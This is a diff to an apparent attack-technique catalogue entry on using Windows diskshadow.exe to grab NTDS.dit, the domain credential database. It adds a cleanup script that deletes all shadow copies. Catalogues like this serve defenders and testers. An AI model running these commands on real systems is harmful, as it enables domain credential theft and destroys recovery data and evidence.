@@ -5,6 +5,7 @@ functions:
     - description: Grab NTDS.dit with diskshadow
       code: |
         shadow.txt Script:
+
         set context persistent nowriters
         add volume c: alias someAlias
         create
@@ -14,6 +15,12 @@ functions:
         reset
         
         Command: diskshadow.exe /s c:\diskshadow.txt
+
+        unshadow.txt Script:
+
+        delete shadows all
+
+        Command: diskshadow.exe /s c:\unshadow.txt
 
         REMINDER: If created on linux you will need to run unix2dos to convert the line returns
 
